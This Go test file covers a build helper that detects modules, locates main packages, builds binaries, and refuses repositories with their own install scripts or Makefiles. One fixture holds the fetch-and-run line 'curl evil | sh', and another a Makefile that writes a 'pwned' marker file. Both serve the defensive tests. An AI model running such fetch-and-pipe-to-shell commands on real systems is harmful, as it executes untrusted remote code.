package gobuild

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func module(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestDetectGoModule(t *testing.T) {
	dir := module(t, map[string]string{"go.mod": "module example.com/tool\n\ngo 1.21\n"})
	if !Detect(dir) {
		t.Fatal("a go.mod should be detected")
	}
	if Detect(t.TempDir()) {
		t.Fatal("a directory without go.mod is not a Go module")
	}
}

func TestFindMainPackagePrefersRoot(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":  "module example.com/tool\n",
		"main.go": "package main\n\nfunc main() {}\n",
	})
	pkg, err := FindMainPackage(dir, "")
	if err != nil || pkg != "." {
		t.Fatalf("pkg = %q err = %v", pkg, err)
	}
}

func TestFindMainPackageFindsSingleCommand(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":            "module example.com/tool\n",
		"cmd/tool/main.go":  "package main\n\nfunc main() {}\n",
		"cmd/tool/other.go": "package main\n",
	})
	pkg, err := FindMainPackage(dir, "")
	if err != nil || pkg != "./cmd/tool" {
		t.Fatalf("pkg = %q err = %v", pkg, err)
	}
}

func TestFindMainPackageAmbiguous(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":        "module example.com/tool\n",
		"cmd/a/main.go": "package main\n",
		"cmd/b/main.go": "package main\n",
	})
	if _, err := FindMainPackage(dir, ""); err == nil {
		t.Fatal("ambiguous commands must not be guessed")
	}
}

func TestBuildProducesBinary(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":  "module example.com/tool\n\ngo 1.21\n",
		"main.go": "package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hi\") }\n",
	})
	out := filepath.Join(t.TempDir(), "tool")
	res, err := Build(context.Background(), Request{SourceDir: dir, Output: out}, "")
	if err != nil {
		t.Skipf("go toolchain unavailable in this environment: %v", err)
	}
	if res.Binary != out {
		t.Fatalf("binary = %q", res.Binary)
	}
	if _, err := os.Stat(out); err != nil {
		t.Fatalf("binary not produced: %v", err)
	}
	if len(res.Command) < 2 || res.Command[0] == "" {
		t.Fatal("the build command must be recorded")
	}
}

func TestBuildRefusesRepositoryWithInstallScript(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":     "module example.com/tool\n\ngo 1.21\n",
		"main.go":    "package main\n\nfunc main() {}\n",
		"install.sh": "#!/bin/sh\ncurl evil | sh\n",
	})
	_, err := Build(context.Background(), Request{SourceDir: dir, Output: filepath.Join(t.TempDir(), "tool")}, "")
	if err == nil {
		t.Fatal("a repository with its own install script must require authorization")
	}
	refusal, ok := err.(*Refusal)
	if !ok {
		t.Fatalf("error should be a structured refusal, got %T", err)
	}
	if refusal.Required != "allow_source_build" {
		t.Fatalf("required = %q, want allow_source_build", refusal.Required)
	}
}

func TestBuildNeverRunsMakefile(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":   "module example.com/tool\n\ngo 1.21\n",
		"main.go":  "package main\n\nfunc main() {}\n",
		"Makefile": "all:\n\t@echo pwned > /tmp/gobuild-should-not-exist\n",
	})
	_, err := Build(context.Background(), Request{SourceDir: dir, Output: filepath.Join(t.TempDir(), "tool")}, "")
	if _, statErr := os.Stat("/tmp/gobuild-should-not-exist"); statErr == nil {
		t.Fatal("the Makefile was executed: build must never run project scripts")
	}
	// Whether the build proceeds is secondary; the script must not run.
	_ = err
}

func TestBuildRefusesNonModule(t *testing.T) {
	dir := t.TempDir()
	_, err := Build(context.Background(), Request{SourceDir: dir, Output: filepath.Join(t.TempDir(), "x")}, "")
	if err == nil {
		t.Fatal("non-module must be refused")
	}
}

func TestRefusalMessagesAreActionable(t *testing.T) {
	dir := module(t, map[string]string{
		"go.mod":   "module example.com/tool\n",
		"main.go":  "package main\n",
		"Makefile": "all:\n\t@echo hi\n",
	})
	_, err := Build(context.Background(), Request{SourceDir: dir, Output: filepath.Join(t.TempDir(), "x")}, "")
	if err == nil {
		t.Fatal("expected a refusal")
	}
	r := err.(*Refusal)
	if !strings.Contains(r.Reason, "build tooling") {
		t.Fatalf("reason should explain what was found: %q", r.Reason)
	}
	if len(r.Details) == 0 {
		t.Fatal("refusal should list what triggered it")
	}
}
